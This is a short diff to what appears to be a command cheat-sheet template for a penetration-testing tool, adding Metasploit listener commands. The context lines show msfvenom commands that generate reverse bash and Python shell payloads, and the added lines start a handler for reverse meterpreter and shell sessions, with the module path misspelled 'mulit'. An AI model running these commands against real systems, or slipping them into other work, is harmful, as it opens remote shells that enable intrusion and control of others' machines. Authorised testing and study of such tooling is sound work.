@@ -70,3 +70,18 @@ msfvenom -p cmd/unix/reverse_python LHOST=#{LHOST} LPORT=#{LPORT} -f raw > rever
 
 # desc: Base
 msfvenom -p cmd/unix/reverse_bash LHOST=#{LHOST} LPORT=#{LPORT} -f raw > shell.sh
+
+# desc: MSFconsole
+msfconsole -x "use exploit/mulit/handler; set payload #{msf_module}; set LHOST #{LHOST}; set LPORT #{LPORT}; exploit -j"
+
+# desc: MSFconsole
+use exploit/mulit/handler
+set payload #{msf_module}
+set LHOST #{LHOST}
+set LPORT #{LPORT}
+exploit -j
+
+@msf_module.desc(payload 模块)
+@msf_module.recommend(windows/meterpreter/reverse_tcp)
+@msf_module.recommend(linux/x86/meterpreter/reverse_tcp)
+@msf_module.recommend(linux/x64/shell_reverse_tcp)
